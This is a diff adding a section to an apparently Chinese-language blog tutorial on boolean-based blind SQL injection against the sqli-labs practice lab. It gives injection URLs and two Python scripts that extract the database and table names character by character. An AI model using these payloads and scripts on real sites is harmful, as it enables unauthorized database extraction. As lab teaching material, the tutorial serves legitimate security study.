@@ -270,6 +270,138 @@ floor(rand(0)*2))a from information_schema.tables group by a)x)%23
 
 <img src="/images/sql_8.png">
 
+<code>update 2016/4/26 </code>
+
+<h3>Part 3</h3>
+
+<h4> Blind -Bool based</h4>
+
+这种类型的注入是基于bool，也就是根据正常页面来判断当前注入的语句是否成功执行。
+存在的情况有点像是在一个页面，你可以使用sql语句，但是你不能看到sql语句后的结果，
+那么就只有盲注来猜测返回的是什么内容。
+
+例如: http://192.168.1.104/sqli-labs/Less-8/?id=1  这样就是正常情况下。
+如果加上:http://192.168.1.104/sqli-labs/Less-8/?id=1' and 0 --+ 
+1为true，0则为false。产生的结果就不一样。
+
+利用到的语句:
+<code>select database()</code>
+<code>select length(databse())</code>
+<code>select substr(database(),1,1)</code>
+
+<h4>Example</h4>
+
+在sqli的less8中，就是一种bool based injection。
+
+首先，盲注猜测出当前的数据库名。
+利用 select database()可以返回当前数据库的名字。那么怎么和bool联系上？
+因为我们用到的是盲注，是不知道database的名字的，也就是说不知道名字的长度。
+于是 select length(databse()) 返回当前数据库名字的长度。
+返回长度那又怎么让自己知道呢。
+加上一个判断值，就能构成一个bool值了。
+
+例如: http://192.168.1.104/sqli-labs/Less-8/?id=1' and (select length(database()))=8 --+ 
+很明显，数据库的名字长度是8，所以我当然猜是8。
+在完全不知情的情况下，还可以用二分法来判断，进行大于小于的比较，产生一个bool值。
+逐步缩小范围，最后确定数据库名字的长度。
+
+到这里，才知道了数据库名字的长度，那么怎么继续通过盲注获得具体名字呢。
+有一个函数 substr(str,1,1)  substr是字串函数，str是原字符串。
+第二个变量是字串在str中的起始位置，第二个是字串的长度。
+
+例如:http://192.168.1.104/sqli-labs/Less-8/?id=1' and (select substr(databse(),1,1))='s' --+
+
+<img src="/images/sql_9.png">
+
+因为在sqli里面，数据库的名字叫security。
+如果在不知情的情况下，去猜测的话，那么就是a-z,A-Z，0-9 以及 _
+这样手工盲注的话，得累死。 
+
+python写一个小脚本。
+
+{% highlight python %}
+
+# -*- coding: utf-8 -*-
+import requests
+
+result = ""	
+
+url="http://192.168.1.106/sqli-labs/Less-8/?id=1'and (select substr(database(),%d,1))='%s'--+"
+
+for x in range(1,9):
+	flag=True
+	for i in range(ord('a'),ord('z')+1):
+		if(flag == False):
+			break
+		test_url = url % (x,chr(i))
+		r = requests.get(test_url)
+		if "You are in" in r.content:
+			result = result + chr(i)
+			flag = False
+	for i in range(ord('A'),ord('Z')+1):
+		if(flag == False):
+			break
+		test_url = url % (x,chr(i))
+		r = requests.get(test_url)
+		if "You are in" in r.content:
+			result = result + chr(i)
+			flag = False
+	print result
+
+{% endhighlight %}
+
+结果:
+
+<img src="/images/sql_10.png">
+
+能猜出数据库的名字，那么就可以利用information_schema.tables
+获取当前数据库的表，获取字段。
+接下来就可以盲注出数据库中的内容。
+
+例如：http://192.168.1.104/sqli-labs/Less-8/?id=1%27%20and%20
+(select%20length(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1)=6%20--+
+
+可以先用count(*)判断有多少表，然后盲注猜表名长度，最后表的名字。
+
+用python盲注表的名字。
+
+{% highlight python %}
+
+# -*- coding: utf-8 -*-
+import requests
+
+result = ""	
+
+url="http://192.168.1.104/sqli-labs/Less-8/?id=1' and (select substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))='%s' --+"
+
+
+for x in range(1,7):
+	flag=True
+	for i in range(ord('a'),ord('z')+1):
+		if(flag == False):
+			break
+		test_url = url % (x,chr(i))
+		r = requests.get(test_url)
+		if "You are in" in r.content:
+			result = result + chr(i)
+			flag = False
+	for i in range(ord('A'),ord('Z')+1):
+		if(flag == False):
+			break
+		test_url = url % (x,chr(i))
+		r = requests.get(test_url)
+		if "You are in" in r.content:
+			result = result + chr(i)
+			flag = False
+	print result
+
+{% endhighlight%}
+
+<img src="/images/sql_11.png">
+
+这个是在获取表名字的长度下进行盲注猜测。
+如果完整的做好的话。估计就是sqlmap了。
+有空做个完整的试试。
 
 <code>...待续</code>
 
